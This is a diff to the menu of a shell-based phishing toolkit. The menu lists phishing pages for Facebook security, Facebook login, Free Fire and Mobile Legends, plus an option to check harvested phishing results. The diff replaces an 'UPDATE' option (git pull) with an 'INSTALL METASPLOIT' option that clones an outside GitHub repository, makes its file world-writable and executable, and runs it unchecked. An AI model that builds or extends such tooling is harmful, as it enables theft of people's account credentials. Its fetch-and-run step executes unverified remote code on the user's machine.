@@ -35,7 +35,7 @@ echo $pur"["$ku"2"$pur"]"$ku"[+]PHISING FACEBOOK SECURITY"
 echo $pur"["$ku"3"$pur"]"$ku"[+]PHISING FACEBOOK LOGIN"
 echo $pur"["$ku"4"$pur"]"$ku"[+]PHISING FREEFIRE"
 echo $pur"["$ku"5"$pur"]"$ku"[+]PHISING MOBILE LEGENDS"
-echo $pur"["$ku"6"$pur"]"$ku"[+]UPDATE"
+echo $pur"["$ku"6"$pur"]"$ku"[+]INSTALL METASPLOIT"
 echo $pur"["$ku"7"$pur"]"$ku"[+]CEK HASIL PHISHING"
 echo $pur"["$ku"8"$pur"]"$ku"[+]EXIT"
 echo $cy"___________________________________________________________________________"
@@ -102,7 +102,10 @@ fi
 
 if [ $pil = 6 ]
 then
-git pull
+git clone https://github.com/4L13199/meTAInstall
+cd meTAInstall
+chmod 777 meTAInstall
+sh meTAInstall
 fi
 
 if [ $pil = 7 ]
